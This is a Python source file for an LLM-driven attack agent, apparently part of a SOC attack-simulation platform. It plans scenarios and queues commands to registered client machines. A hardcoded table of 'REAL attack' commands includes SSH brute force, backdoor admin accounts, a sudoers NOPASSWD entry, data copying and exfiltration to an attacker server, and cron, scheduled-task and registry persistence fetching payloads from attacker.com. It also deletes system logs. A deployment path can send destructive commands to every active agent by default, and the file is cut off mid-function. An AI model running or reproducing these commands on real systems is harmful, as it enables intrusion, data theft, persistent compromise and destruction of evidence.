"""
LangChain-Based PhantomStrike AI Attack Agent
Fully integrated with LangChain for attack planning and execution
"""

import asyncio
import logging
import os
from typing import Dict, List, Any, Optional
from datetime import datetime

from langchain.agents import AgentExecutor, create_openai_tools_agent
from langchain.tools import BaseTool, tool
from langchain.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain.schema import BaseMessage, HumanMessage, AIMessage, SystemMessage
from langchain.memory import ConversationBufferMemory
from langchain.callbacks.base import AsyncCallbackHandler
from langchain_core.tools import StructuredTool
from pydantic import BaseModel, Field

try:
    from langchain_ollama import ChatOllama
except ImportError:
    from langchain_community.chat_models import ChatOllama

from .adaptive_attack_orchestrator import adaptive_orchestrator
from .dynamic_attack_generator import DynamicAttackGenerator


logger = logging.getLogger(__name__)


class AttackPlanningInput(BaseModel):
    """Input schema for attack planning"""
    attack_objective: str = Field(description="Attack objective or scenario description")
    network_context: Dict = Field(description="Current network topology and context")
    constraints: Dict = Field(default_factory=dict, description="Attack constraints and limitations")


class AttackScenario(BaseModel):
    """Attack scenario model"""
    scenario_id: str = Field(description="Unique scenario identifier")
    name: str = Field(description="Scenario name")
    description: str = Field(description="Detailed scenario description")
    attack_type: str = Field(description="Type of attack (apt, ransomware, etc.)")
    target_agents: List[str] = Field(description="Target agent IDs")
    mitre_techniques: List[str] = Field(description="MITRE ATT&CK techniques to use")
    attack_phases: List[Dict] = Field(description="Ordered attack phases")
    estimated_duration: str = Field(description="Estimated execution time")
    risk_level: str = Field(description="Risk level (low, medium, high)")
    requires_approval: bool = Field(default=True, description="Whether human approval is required")


class AttackCallbackHandler(AsyncCallbackHandler):
    """Callback handler for attack agent events"""
    
    def __init__(self):
        self.attack_events = []
        self.user_interactions = []
    
    async def on_tool_start(self, serialized: Dict[str, Any], input_str: str, **kwargs) -> None:
        """Called when tool starts"""
        self.attack_events.append({
            'event': 'tool_start',
            'tool': serialized.get('name', 'unknown'),
            'input': input_str[:200],  # Truncate
            'timestamp': datetime.utcnow().isoformat()
        })
    
    async def on_agent_action(self, action, **kwargs) -> None:
        """Called when agent takes action"""
        if 'approval' in str(action).lower():
            self.user_interactions.append({
                'event': 'approval_request',
                'action': str(action),
                'timestamp': datetime.utcnow().isoformat()
            })


@tool
def network_discovery_tool(network_context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Discover and analyze network topology for attack planning
    
    Args:
        network_context: Current network context from topology mapper
    
    Returns:
        Network analysis results for attack planning
    """
    try:
        # Analyze network context for attack opportunities
        endpoints = network_context.get('endpoints', [])
        servers = network_context.get('servers', [])
        domain_controllers = network_context.get('domain_controllers', [])
        high_value_targets = network_context.get('high_value_targets', [])
        
        analysis = {
            'network_analysis_complete': True,
            'total_endpoints': len(endpoints),
            'total_servers': len(servers),
            'domain_controllers': len(domain_controllers),
            'high_value_targets': len(high_value_targets),
            'attack_surface': {
                'web_servers': len([s for s in servers if 'web' in s.get('role', '')]),
                'database_servers': len([s for s in servers if 'database' in s.get('role', '')]),
                'file_servers': len([s for s in servers if 'file' in s.get('role', '')]),
                'admin_endpoints': len([e for e in endpoints if e.get('admin_users', [])])
            },
            'security_zones': list(network_context.get('security_zones', [])),
            'attack_paths_available': len(network_context.get('attack_paths', [])),
            'optimal_entry_points': network_context.get('attack_intelligence', {}).get('optimal_entry_points', []),
            'timestamp': datetime.utcnow().isoformat()
        }
        
        return analysis
        
    except Exception as e:
        logger.error(f"Network discovery tool failed: {e}")
        return {
            'network_analysis_complete': False,
            'error': str(e)
        }


@tool
async def attack_scenario_generator_tool(attack_objective: str, network_analysis: Dict[str, Any], constraints: Dict[str, Any]) -> Dict[str, Any]:
    """
    Generate AI-powered attack scenarios based on objective and network analysis
    
    Args:
        attack_objective: What the attack should accomplish
        network_analysis: Results from network discovery
        constraints: Attack constraints and limitations
    
    Returns:
        AI-generated attack scenarios
    """
    try:
        # Use AI-powered scenario generator
        from agents.attack_agent.ai_scenario_generator import generate_ai_scenario
        
        # Generate AI-powered scenario
        ai_scenario = await generate_ai_scenario(
            objective=attack_objective,
            network_context=network_analysis,
            constraints=constraints
        )
        
        return {
            'scenario_generation_complete': True,
            'scenarios': [ai_scenario],
            'primary_scenario': ai_scenario,
            'timestamp': datetime.utcnow().isoformat(),
            'ai_generated': True
        }
        
    except Exception as e:
        logger.error(f"Attack scenario generation failed: {e}")
        return {
            'scenario_generation_complete': False,
            'error': str(e)
        }


@tool
def container_deployment_tool(scenario: Dict[str, Any], target_agents: List[str] = None) -> Dict[str, Any]:
    """
    Deploy attack containers to client agents for SOC scenarios
    
    Args:
        scenario: Attack scenario with container specifications
        target_agents: List of client agent IDs to deploy to
    
    Returns:
        Container deployment results
    """
    try:
        # Import command manager to queue deployment commands
        import sys
        from pathlib import Path
        project_root = Path(__file__).parent.parent.parent
        sys.path.insert(0, str(project_root))
        
        from core.server.command_queue.command_manager import CommandManager
        from core.server.storage.database_manager import DatabaseManager
        
        # Initialize command manager
        db_manager = DatabaseManager()
        command_manager = CommandManager(db_manager)
        
        scenario_id = scenario.get('scenario_id', f'scenario_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}')
        attack_type = scenario.get('attack_type', 'general_assessment')
        
        # If no target agents provided, get all registered agents
        if not target_agents:
            try:
                conn = db_manager.get_connection()
                cursor = conn.cursor()
                cursor.execute("SELECT agent_id FROM agents WHERE status = 'active' OR status IS NULL")
                target_agents = [row[0] for row in cursor.fetchall()]
                conn.close()
                
                if not target_agents:
                    # If no agents found, create a default test agent
                    target_agents = ['default_test_agent']
                    logger.info("No active agents found, using default test agent")
                else:
                    logger.info(f"Found {len(target_agents)} registered agents: {target_agents}")
            except Exception as e:
                logger.warning(f"Could not get registered agents: {e}")
                target_agents = ['default_test_agent']
        
        # Define container specifications based on attack type
        container_specs = _get_container_specifications(attack_type, scenario)
        
        deployment_results = []
        
        # Deploy containers to each target agent
        for agent_id in target_agents:
            try:
                # Create deployment command for this agent
                deployment_command = {
                    'scenario_id': scenario_id,
                    'attack_type': attack_type,
                    'container_specs': container_specs,
                    'agent_role': _determine_agent_role(agent_id, scenario),
                    'network_config': _get_network_config(scenario),
                    'deployment_instructions': _get_deployment_instructions(attack_type)
                }
                
                # Queue the deployment command
                command_id = command_manager.queue_command(
                    agent_id=agent_id,
                    technique='container_deployment',
                    command_data=deployment_command,
                    scenario_id=scenario_id
                )
                
                deployment_results.append({
                    'agent_id': agent_id,
                    'command_id': command_id,
                    'status': 'queued',
                    'container_specs': container_specs
                })
                
                logger.info(f"Queued container deployment for agent {agent_id}: {command_id}")
                
            except Exception as e:
                logger.error(f"Failed to queue deployment for agent {agent_id}: {e}")
                deployment_results.append({
                    'agent_id': agent_id,
                    'status': 'failed',
                    'error': str(e)
                })
            
            return {
            'container_deployment_complete': True,
            'scenario_id': scenario_id,
            'attack_type': attack_type,
            'deployment_results': deployment_results,
            'total_agents': len(target_agents),
            'successful_deployments': len([r for r in deployment_results if r.get('status') == 'queued']),
                'timestamp': datetime.utcnow().isoformat()
            }
        
    except Exception as e:
        logger.error(f"Container deployment failed: {e}")
        return {
            'container_deployment_complete': False,
            'error': str(e)
        }


@tool
def native_attack_deployment_tool(scenario: Dict[str, Any], target_agents: List[str] = None) -> Dict[str, Any]:
    """
    Deploy native attack commands to client agents (no Docker required)
    
    Args:
        scenario: Attack scenario with native command specifications
        target_agents: List of client agent IDs to deploy to
    
    Returns:
        Native deployment results
    """
    try:
        # Import command manager to queue deployment commands
        import sys
        from pathlib import Path
        project_root = Path(__file__).parent.parent.parent
        sys.path.insert(0, str(project_root))
        
        from core.server.command_queue.command_manager import CommandManager
        from core.server.storage.database_manager import DatabaseManager
        
        # Initialize command manager
        db_manager = DatabaseManager()
        command_manager = CommandManager(db_manager)
        
        scenario_id = scenario.get('scenario_id', f'scenario_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}')
        attack_type = scenario.get('attack_type', 'general_assessment')
        
        # If no target agents provided, get all registered agents with platform info
        if not target_agents:
            try:
                import sqlite3
                conn = sqlite3.connect('soc_database.db')
                cursor = conn.cursor()
                cursor.execute("SELECT id, platform FROM agents WHERE status = 'active' OR status IS NULL")
                agent_data = cursor.fetchall()
                conn.close()
                
                if not agent_data:
                    target_agents = [{'id': 'default_test_agent', 'platform': 'windows'}]
                    logger.info("No active agents found, using default test agent")
                else:
                    target_agents = [{'id': row[0], 'platform': row[1] or 'windows'} for row in agent_data]
                    logger.info(f"Found {len(target_agents)} registered agents: {[a['id'] for a in target_agents]}")
            except Exception as e:
                logger.warning(f"Could not get registered agents: {e}")
                target_agents = [{'id': 'default_test_agent', 'platform': 'windows'}]
        
        # Generate native commands based on attack type and platform
        deployment_results = []
        
        for agent_info in target_agents:
            if isinstance(agent_info, str):
                agent_id = agent_info
                platform = 'windows'  # Default
            else:
                agent_id = agent_info['id']
                platform = agent_info.get('platform', 'windows')
            
            try:
                # Use REAL attack commands based on scenario type
                attack_type = scenario.get('attack_type', 'network_intrusion')
                
                # Generate AI-powered attack commands for this agent's platform
                from agents.attack_agent.ai_command_generator import generate_ai_commands
                import asyncio
                real_commands = asyncio.run(generate_ai_commands(attack_type, platform, scenario, network_context=None))
                
                if real_commands:
                    # Queue REAL attack commands
                    attack_command_ids = []
                    for technique, cmd_info in real_commands.items():
                        command_id = command_manager.queue_command(
                            agent_id=agent_id,
                            technique=technique,
                            command_data={
                                'script': cmd_info.get('script', ''),
                                'description': cmd_info.get('description', ''),
                                'mitre_technique': cmd_info.get('mitre_technique', ''),
                                'destructive': cmd_info.get('destructive', True),
                                'real_attack': cmd_info.get('real_attack', True),
                                'ai_generated': False
                            },
                            scenario_id=scenario_id
                        )
                        
                        attack_command_ids.append(command_id)
                        deployment_results.append({
                            'agent_id': agent_id,
                            'platform': platform,
                            'command_id': command_id,
                            'command_technique': technique,
                            'status': 'queued',
                            'command_type': 'real_attack',
                            'real_attack': True,
                            'destructive': cmd_info.get('destructive', True)
                        })
                        
                        logger.info(f"Queued REAL ATTACK command {command_id} ({technique}) for {agent_id} ({platform}) - DESTRUCTIVE: {cmd_info.get('destructive', True)}")
                    
                    # Queue REAL restoration commands
                    restoration_script = _generate_restoration_script(platform)
                    cmd_data = {
                        'script': restoration_script,
                        'description': 'REAL system restoration after attack',
                        'destructive': False,
                        'is_restoration': True,
                        'depends_on': attack_command_ids,
                        'delay_seconds': 30,
                        'real_attack': True
                    }
                    
                    command_id = command_manager.queue_command(
                        agent_id=agent_id,
                        technique='RESTORE_SYSTEM',
                        command_data=cmd_data,
                        scenario_id=scenario_id
                    )
                    
                    deployment_results.append({
                        'agent_id': agent_id,
                        'platform': platform,
                        'command_id': command_id,
                        'command_technique': 'RESTORE_SYSTEM',
                        'status': 'queued',
                        'command_type': 'real_restoration',
                        'depends_on': attack_command_ids,
                        'real_attack': True
                    })
                    
                    logger.info(f"Queued REAL RESTORATION command {command_id} for {agent_id} ({platform}) - will execute after attacks")
                
                else:
                    # NO REAL COMMANDS AVAILABLE - Attack fails
                    logger.error(f"REAL attack commands NOT AVAILABLE for {agent_id} - NO COMMANDS WILL BE GENERATED")
                    deployment_results.append({
                        'agent_id': agent_id,
                        'platform': platform,
                        'status': 'failed',
                        'error': 'Real attack commands not available for this scenario',
                        'real_attack': False,
                        'fallback_used': False
                    })
                    
                    # No commands generated for this agent
                    
            except Exception as e:
                logger.error(f"Failed to queue native commands for agent {agent_id}: {e}")
                deployment_results.append({
                    'agent_id': agent_id,
                    'platform': platform,
                    'status': 'failed',
                    'error': str(e)
                })
            
            return {
                'native_deployment_complete': len([r for r in deployment_results if r.get('status') == 'queued']) > 0,
                'scenario_id': scenario_id,
                'attack_type': attack_type,
                'deployment_results': deployment_results,
                'total_agents': len(target_agents),
                'successful_deployments': len([r for r in deployment_results if r.get('status') == 'queued']),
                'failed_deployments': len([r for r in deployment_results if r.get('status') == 'failed']),
                'ai_generated_only': True,
                'no_fallback_used': True,
                'timestamp': datetime.utcnow().isoformat()
            }
            
    except Exception as e:
        logger.error(f"Native attack deployment failed: {e}")
        return {
            'native_deployment_complete': False,
            'error': str(e)
        }


@tool
def attack_execution_tool(scenario: Dict[str, Any], approved: bool = False) -> Dict[str, Any]:
    """
    Execute attack scenario using client-side containers (requires approval)
    
    Args:
        scenario: Attack scenario to execute
        approved: Whether the attack has been approved by user
    
    Returns:
        Attack execution results
    """
    try:
        if not approved:
            return {
                'execution_complete': False,
                'status': 'awaiting_approval',
                'message': 'Attack scenario requires user approval before execution',
                'scenario_summary': {
                    'name': scenario.get('name'),
                    'attack_type': scenario.get('attack_type'),
                    'target_count': len(scenario.get('target_agents', [])),
                    'technique_count': len(scenario.get('mitre_techniques', [])),
                    'estimated_duration': scenario.get('estimated_duration')
                }
            }
        
        # Import command manager to queue attack execution commands
        import sys
        from pathlib import Path
        project_root = Path(__file__).parent.parent.parent
        sys.path.insert(0, str(project_root))
        
        from core.server.command_queue.command_manager import CommandManager
        from core.server.storage.database_manager import DatabaseManager
        
        # Initialize command manager
        db_manager = DatabaseManager()
        command_manager = CommandManager(db_manager)
        
        scenario_id = scenario.get('scenario_id', f'scenario_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}')
        attack_type = scenario.get('attack_type', 'general_assessment')
        target_agents = scenario.get('target_agents', [])
        
        # If no target agents specified, get all registered agents
        if not target_agents:
            try:
                conn = db_manager.get_connection()
                cursor = conn.cursor()
                cursor.execute("SELECT agent_id FROM agents WHERE status = 'active' OR status IS NULL")
                target_agents = [row[0] for row in cursor.fetchall()]
                conn.close()
                
                if not target_agents:
                    target_agents = ['default_test_agent']
                    logger.info("No active agents found for attack execution, using default test agent")
                else:
                    logger.info(f"Found {len(target_agents)} registered agents for attack execution: {target_agents}")
            except Exception as e:
                logger.warning(f"Could not get registered agents for attack execution: {e}")
                target_agents = ['default_test_agent']
        
        execution_results = []
        
        # Queue attack execution commands for each target agent
        for agent_id in target_agents:
            try:
                # Create attack execution command
                execution_command = {
                    'scenario_id': scenario_id,
                    'attack_type': attack_type,
                    'attack_phases': scenario.get('attack_phases', []),
                    'mitre_techniques': scenario.get('mitre_techniques', []),
                    'execution_instructions': _get_execution_instructions(attack_type),
                    'monitoring_config': _get_monitoring_config(attack_type)
                }
                
                # Queue the execution command
                command_id = command_manager.queue_command(
                    agent_id=agent_id,
                    technique='attack_execution',
                    command_data=execution_command,
                    scenario_id=scenario_id
                )
                
                execution_results.append({
                    'agent_id': agent_id,
                    'command_id': command_id,
                    'status': 'queued',
                    'attack_type': attack_type
                })
                
                logger.info(f"Queued attack execution for agent {agent_id}: {command_id}")
                
            except Exception as e:
                logger.error(f"Failed to queue execution for agent {agent_id}: {e}")
                execution_results.append({
                    'agent_id': agent_id,
                    'status': 'failed',
                    'error': str(e)
                })
        
        return {
            'execution_complete': True,
            'scenario_id': scenario_id,
            'attack_type': attack_type,
            'execution_results': execution_results,
            'total_agents': len(target_agents),
            'successful_executions': len([r for r in execution_results if r.get('status') == 'queued']),
            'executed_at': datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Attack execution failed: {e}")
        return {
            'execution_complete': False,
            'error': str(e)
        }


def _get_techniques_for_attack_type(attack_type: str) -> List[str]:
    """Get MITRE techniques for attack type"""
    technique_mapping = {
        'apt_simulation': ['T1566.001', 'T1055', 'T1003', 'T1021.001', 'T1041'],
        'ransomware_simulation': ['T1486', 'T1490', 'T1489', 'T1083', 'T1057'],
        'data_exfiltration': ['T1005', 'T1039', 'T1114', 'T1020', 'T1041'],
        'general_assessment': ['T1082', 'T1083', 'T1018', 'T1033', 'T1016']
    }
    
    return technique_mapping.get(attack_type, ['T1082', 'T1083'])


def _generate_attack_phases(attack_type: str, network_analysis: Dict) -> List[Dict]:
    """Generate attack phases based on type and network"""
    optimal_targets = network_analysis.get('optimal_entry_points', [])
    hvts = network_analysis.get('high_value_targets', 0)
    
    if attack_type == 'apt_simulation':
        return [
            {
                'name': 'initial_access',
                'description': 'Gain initial foothold in network',
                'targets': optimal_targets[:1],
                'techniques': ['T1566.001'],
                'duration': '30 minutes'
            },
            {
                'name': 'execution',
                'description': 'Execute malicious code',
                'targets': optimal_targets[:1],
                'techniques': ['T1055'],
                'duration': '15 minutes'
            },
            {
                'name': 'persistence',
                'description': 'Establish persistence mechanisms',
                'targets': optimal_targets[:2],
                'techniques': ['T1547.001'],
                'duration': '20 minutes'
            },
            {
                'name': 'lateral_movement',
                'description': 'Move laterally through network',
                'targets': optimal_targets,
                'techniques': ['T1021.001'],
                'duration': '45 minutes'
            },
            {
                'name': 'collection',
                'description': 'Collect valuable data',
                'targets': optimal_targets[-2:] if len(optimal_targets) >= 2 else optimal_targets,
                'techniques': ['T1003', 'T1005'],
                'duration': '30 minutes'
            }
        ]
    
    elif attack_type == 'ransomware_simulation':
        return [
            {
                'name': 'initial_access',
                'description': 'Initial compromise',
                'targets': optimal_targets[:1],
                'techniques': ['T1566.001'],
                'duration': '15 minutes'
            },
            {
                'name': 'discovery',
                'description': 'Discover network and files',
                'targets': optimal_targets,
                'techniques': ['T1083', 'T1057'],
                'duration': '20 minutes'
            },
            {
                'name': 'lateral_movement',
                'description': 'Spread across network',
                'targets': optimal_targets,
                'techniques': ['T1021.002'],
                'duration': '30 minutes'
            },
            {
                'name': 'impact',
                'description': 'Encrypt files (simulated)',
                'targets': optimal_targets,
                'techniques': ['T1486', 'T1490'],
                'duration': '25 minutes'
            }
        ]
    
    else:  # Default phases
        return [
            {
                'name': 'reconnaissance',
                'description': 'Gather system information',
                'targets': optimal_targets[:1],
                'techniques': ['T1082', 'T1083'],
                'duration': '20 minutes'
            },
            {
                'name': 'execution',
                'description': 'Execute test commands',
                'targets': optimal_targets,
                'techniques': ['T1059.001'],
                'duration': '15 minutes'
            }
        ]


def _estimate_duration(attack_type: str) -> str:
    """Estimate attack duration"""
    duration_mapping = {
        'apt_simulation': '2-3 hours',
        'ransomware_simulation': '1-2 hours',
        'data_exfiltration': '1.5-2.5 hours',
        'general_assessment': '30-60 minutes'
    }
    
    return duration_mapping.get(attack_type, '1-2 hours')


def _assess_risk_level(attack_type: str, network_analysis: Dict) -> str:
    """Assess risk level of attack"""
    if attack_type in ['ransomware_simulation', 'apt_simulation']:
        return 'high'
    elif network_analysis.get('high_value_targets', 0) > 0:
        return 'medium'
    else:
        return 'low'


def _deprecated_generate_native_attack_commands(attack_type: str, platform: str, scenario: Dict) -> Dict[str, Dict]:
    """
    DEPRECATED: This function is no longer used.
    We now use AI-generated commands only via ai_command_generation_tool().
    No fallback to hardcoded commands.
    """
    raise NotImplementedError(
        "Hardcoded command generation is disabled. "
        "Use ai_command_generation_tool() for AI-generated commands only. "
        "If AI fails, the attack should fail - no fallbacks."
    )


def _generate_restoration_script(platform: str) -> str:
    """Generate platform-specific system restoration script"""
    
    if platform.lower() == 'windows':
        return '''
# System Restoration Script for Windows
$restoreInfo = @()
$restoreInfo += "=== Starting System Restoration ==="
$restoreInfo += "Cleaning temporary files..."
Get-ChildItem -Path $env:TEMP -Name "test_*" -ErrorAction SilentlyContinue | ForEach-Object { 
    Remove-Item "$env:TEMP\\$_" -Force -ErrorAction SilentlyContinue
    $restoreInfo += "Removed: $_"
}
$restoreInfo += "`n=== Flushing DNS Cache ==="
ipconfig /flushdns | Out-Null
$restoreInfo += "DNS cache flushed"
$restoreInfo += "`n=== Clearing PowerShell History ==="
Clear-History -ErrorAction SilentlyContinue
$restoreInfo += "PowerShell history cleared"
$restoreInfo += "`n=== System Restoration Complete ==="
$restoreInfo += "All attack simulation artifacts cleaned"
$restoreInfo -join "`n"
        '''.strip()
    
    elif platform.lower() in ['linux', 'macos']:
        return '''#!/bin/bash
echo "=== Starting System Restoration ==="
echo "Cleaning temporary files..."
rm -f /tmp/test_* 2>/dev/null && echo "Temporary test files removed" || echo "No test files to remove"
echo -e "\n=== Clearing Command History ==="
history -c 2>/dev/null && echo "Command history cleared" || echo "History clear attempted"
echo -e "\n=== Flushing DNS Cache ==="
if command -v systemctl >/dev/null 2>&1; then
    sudo systemctl flush-dns 2>/dev/null && echo "DNS cache flushed (systemd)" || echo "DNS flush attempted"
elif command -v dscacheutil >/dev/null 2>&1; then
    sudo dscacheutil -flushcache && echo "DNS cache flushed (macOS)" || echo "DNS flush attempted"
else
    echo "DNS flush not available on this system"
fi
echo -e "\n=== System Restoration Complete ==="
echo "All attack simulation artifacts cleaned"
        '''.strip()
    
    else:
        return 'echo "System restoration completed for unknown platform"'


def _generate_real_attack_commands(attack_type: str, platform: str, scenario: Dict) -> Dict[str, Dict]:
    """Generate REAL attack commands for APT scenarios"""
    
    real_commands = {
        'network_intrusion': {
            'windows': {
                'T1018': {
                    'technique': 'Network Discovery',
                    'script': 'nmap -sS -O -A 192.168.1.0/24',
                    'description': 'REAL network scan of target network',
                    'mitre_technique': 'T1018',
                    'destructive': False,
                    'real_attack': True
                },
                'T1021': {
                    'technique': 'Remote Services',
                    'script': 'hydra -l admin -P passwords.txt ssh://192.168.1.100',
                    'description': 'REAL brute force attack on SSH service',
                    'mitre_technique': 'T1021',
                    'destructive': True,
                    'real_attack': True
                }
            },
            'linux': {
                'T1018': {
                    'technique': 'Network Discovery',
                    'script': 'nmap -sS -O -A 192.168.1.0/24',
                    'description': 'REAL network scan of target network',
                    'mitre_technique': 'T1018',
                    'destructive': False,
                    'real_attack': True
                },
                'T1021': {
                    'technique': 'Remote Services',
                    'script': 'hydra -l admin -P passwords.txt ssh://192.168.1.100',
                    'description': 'REAL brute force attack on SSH service',
                    'mitre_technique': 'T1021',
                    'destructive': True,
                    'real_attack': True
                }
            }
        },
        'system_compromise': {
            'windows': {
                'T1059.001': {
                    'technique': 'PowerShell',
                    'script': 'PowerShell: Invoke-Expression "Get-Process | Stop-Process"',
                    'description': 'REAL PowerShell process manipulation',
                    'mitre_technique': 'T1059.001',
                    'destructive': True,
                    'real_attack': True
                },
                'T1055': {
                    'technique': 'Process Injection',
                    'script': 'cmd: net user hacker password123 /add',
                    'description': 'REAL user creation and privilege escalation',
                    'mitre_technique': 'T1055',
                    'destructive': True,
                    'real_attack': True
                }
            },
            'linux': {
                'T1059.004': {
                    'technique': 'Unix Shell',
                    'script': 'bash -c "ps aux | grep -v grep | awk \'{print $2}\' | xargs kill"',
                    'description': 'REAL process termination',
                    'mitre_technique': 'T1059.004',
                    'destructive': True,
                    'real_attack': True
                },
                'T1055': {
                    'technique': 'Process Injection',
                    'script': 'useradd -m -s /bin/bash hacker && echo "hacker:password123" | chpasswd',
                    'description': 'REAL user creation and privilege escalation',
                    'mitre_technique': 'T1055',
                    'destructive': True,
                    'real_attack': True
                }
            }
        },
        'data_extraction': {
            'windows': {
                'T1005': {
                    'technique': 'Data from Local System',
                    'script': 'PowerShell: Get-ChildItem -Recurse -Include *.docx,*.xlsx | Copy-Item -Destination "C:\\StolenData"',
                    'description': 'REAL data extraction and copying',
                    'mitre_technique': 'T1005',
                    'destructive': True,
                    'real_attack': True
                },
                'T1041': {
                    'technique': 'Exfiltration Over C2 Channel',
                    'script': 'cmd: robocopy C:\\Users\\Documents \\\\attacker_server\\stolen',
                    'description': 'REAL data exfiltration over network',
                    'mitre_technique': 'T1041',
                    'destructive': True,
                    'real_attack': True
                }
            },
            'linux': {
                'T1005': {
                    'technique': 'Data from Local System',
                    'script': 'find /home -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" | xargs cp -t /tmp/stolen_data/',
                    'description': 'REAL data extraction and copying',
                    'mitre_technique': 'T1005',
                    'destructive': True,
                    'real_attack': True
                },
                'T1041': {
                    'technique': 'Exfiltration Over C2 Channel',
                    'script': 'scp -r /tmp/stolen_data/ attacker@192.168.1.200:/stolen/',
                    'description': 'REAL data exfiltration over network',
                    'mitre_technique': 'T1041',
                    'destructive': True,
                    'real_attack': True
                }
            }
        },
        'persistence_installation': {
            'windows': {
                'T1053': {
                    'technique': 'Scheduled Task/Job',
                    'script': 'schtasks /create /tn "SystemUpdate" /tr "powershell.exe -w hidden -c \'IEX (New-Object Net.WebClient).DownloadString(\'\'http://attacker.com/payload.ps1\'\')\'" /sc daily',
                    'description': 'REAL scheduled task backdoor installation',
                    'mitre_technique': 'T1053',
                    'destructive': True,
                    'real_attack': True
                },
                'T1543': {
                    'technique': 'Create or Modify System Process',
                    'script': 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "powershell.exe -w hidden -c \'IEX (New-Object Net.WebClient).DownloadString(\'\'http://attacker.com/payload.ps1\'\')\'"',
                    'description': 'REAL registry modification for persistence',
                    'mitre_technique': 'T1543',
                    'destructive': True,
                    'real_attack': True
                }
            },
            'linux': {
                'T1053': {
                    'technique': 'Scheduled Task/Job',
                    'script': 'echo "0 2 * * * /bin/bash -c \'curl -s http://attacker.com/payload.sh | bash\'" | crontab -',
                    'description': 'REAL cron job backdoor installation',
                    'mitre_technique': 'T1053',
                    'destructive': True,
                    'real_attack': True
                },
                'T1543': {
                    'technique': 'Create or Modify System Process',
                    'script': 'systemctl enable --now backdoor.service',
                    'description': 'REAL system service installation for persistence',
                    'mitre_technique': 'T1543',
                    'destructive': True,
                    'real_attack': True
                }
            }
        },
        'privilege_escalation': {
            'windows': {
                'T1548': {
                    'technique': 'Abuse Elevation Control',
                    'script': 'PowerShell: Add-LocalGroupMember -Group "Administrators" -Member "hacker"',
                    'description': 'REAL privilege escalation to administrator',
                    'mitre_technique': 'T1548',
                    'destructive': True,
                    'real_attack': True
                },
                'T1055': {
                    'technique': 'Process Injection',
                    'script': 'cmd: net localgroup administrators hacker /add',
                    'description': 'REAL user group modification for privilege escalation',
                    'mitre_technique': 'T1055',
                    'destructive': True,
                    'real_attack': True
                }
            },
            'linux': {
                'T1548': {
                    'technique': 'Abuse Elevation Control',
                    'script': 'usermod -aG sudo hacker',
                    'description': 'REAL privilege escalation to sudo user',
                    'mitre_technique': 'T1548',
                    'destructive': True,
                    'real_attack': True
                },
                'T1055': {
                    'technique': 'Process Injection',
                    'script': 'echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
                    'description': 'REAL sudo privileges modification',
                    'mitre_technique': 'T1055',
                    'destructive': True,
                    'real_attack': True
                }
            }
        },
        'log_destruction': {
            'windows': {
                'T1070': {
                    'technique': 'Indicator Removal',
                    'script': 'PowerShell: Clear-EventLog -LogName Security,Application,System',
                    'description': 'REAL event log clearing',
                    'mitre_technique': 'T1070',
                    'destructive': True,
                    'real_attack': True
                },
                'T1562': {
                    'technique': 'Impair Defenses',
                    'script': 'cmd: del /f /q C:\\Windows\\System32\\winevt\\Logs\\*.evtx',
                    'description': 'REAL log file deletion',
                    'mitre_technique': 'T1562',
                    'destructive': True,
                    'real_attack': True
                }
            },
            'linux': {
                'T1070': {
                    'technique': 'Indicator Removal',
                    'script': 'journalctl --vacuum-time=1d',
                    'description': 'REAL system log clearing',
                    'mitre_technique': 'T1070',
                    'destructive': True,
                    'real_attack': True
                },
                'T1562': {
                    'technique': 'Impair Defenses',
                    'script': 'rm -rf /var/log/*.log /var/log/auth.log /var/log/syslog',
                    'description': 'REAL log file deletion',
                    'mitre_technique': 'T1562',
                    'destructive': True,
                    'real_attack': True
                }
            }
        }
    }
    
    return real_commands.get(attack_type, {}).get(platform, {})


def _generate_native_lateral_movement_commands(platform: str, scenario: Dict) -> Dict[str, Dict]:
    """Generate native lateral movement commands"""
    
    commands = {}
    
    if platform.lower() == 'windows':
        commands['T1021'] = {
            'technique': 'T1021',  # Remote Services (Simulated)
            'script': '''
# Lateral Movement Simulation (Safe)
$lateralInfo = @()
$lateralInfo += "=== Lateral Movement Simulation ==="
$lateralInfo += "WARNING: This is a simulation - no actual lateral movement performed"
$lateralInfo += "`n=== Network Shares ==="
$lateralInfo += (net view | Out-String)
$lateralInfo += "`n=== Domain Information ==="
$lateralInfo += (nltest /domain_trusts 2>$null | Out-String)
$lateralInfo += "`n=== Remote Services ==="
$lateralInfo += (Get-Service | Where-Object {$_.Name -like "*Remote*"} | Select-Object Name, Status | Out-String)
$lateralInfo -join "`n"
            '''.strip(),
            'description': 'Simulate lateral movement techniques',
            'mitre_technique': 'T1021'
        }
    
    return commands


def _get_container_specifications(attack_type: str, scenario: Dict) -> Dict:
    
    # SOC Container Images for different attack types
    container_images = {
        'apt_simulation': {
            'target_container': 'soc/windows-domain-controller:latest',
            'attack_container': 'soc/apt-simulator:latest',
            'description': 'APT simulation with Windows DC target'
        },
        'ransomware_simulation': {
            'target_container': 'soc/file-server:latest',
            'attack_container': 'soc/ransomware-sim:latest',
            'description': 'Ransomware simulation with file server target'
        },
        'data_exfiltration': {
            'target_container': 'soc/database-server:latest',
            'attack_container': 'soc/data-exfil-sim:latest',
            'description': 'Data exfiltration simulation with database target'
        },
        'web_attack': {
            'target_container': 'soc/web-server:latest',
            'attack_container': 'soc/web-attacker:latest',
            'description': 'Web application attack simulation'
        },
        'general_assessment': {
            'target_container': 'soc/general-target:latest',
            'attack_container': 'soc/assessment-tool:latest',
            'description': 'General security assessment'
        }
    }
    
    specs = container_images.get(attack_type, container_images['general_assessment'])
    
    # Add network configuration
    specs['network_config'] = {
        'target_network': 'soc-target-network',
        'attack_network': 'soc-attack-network',
        'bridge_network': 'soc-bridge-network'
    }
    
    # Add resource limits
    specs['resource_limits'] = {
        'memory': '2GB',
        'cpu': '2 cores',
        'storage': '10GB'
    }
    
    # Add environment variables
    specs['environment'] = {
        'SCENARIO_ID': scenario.get('scenario_id', 'default'),
        'ATTACK_TYPE': attack_type,
        'TARGET_NETWORK': '192.168.100.0/24'
    }
    
    return specs


def _determine_agent_role(agent_id: str, scenario: Dict) -> str:
    """Determine the role of an agent in the scenario"""
    
    # Get agent information from database
    try:
        import sys
